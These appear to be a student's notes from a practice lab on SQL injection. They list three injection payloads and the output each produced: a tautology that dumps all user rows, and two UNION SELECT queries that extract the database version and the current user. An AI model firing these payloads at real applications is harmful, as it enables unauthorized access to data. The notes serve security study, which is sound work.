# SQL Injection Lab Exploit Notes

## Payload 1: General Authentication Bypass 
* **payload Entry:** %' OR '1'='1
* **Output Returned:**
  - ID: %' OR '1'='1 First name: admin Surname: admin
  - ID: % OR '1'='1 First name: Gordon Surname: Brown
  - ID: % OR '1'='1 First name: Hack Surname: Me
  - ID: % OR '1'='1 First name: Pablo Surname: Picasso
  - ID: % OR '1'='1 First name: Bob Surname: Smith


## Payload 2: Database Version Extraction
* **Payload Entry:** %' UNION SELECT NULL, version() #
* **Output Returned:** 
  - Surname: 11.8.8-MariaDB-1 from Debian


## Payload 3: Active Database User Extraction
* **Payload Entry:** %' UNION SELECT NULL, user() #
* **Output Returned:**
  - Surname: app@localhost
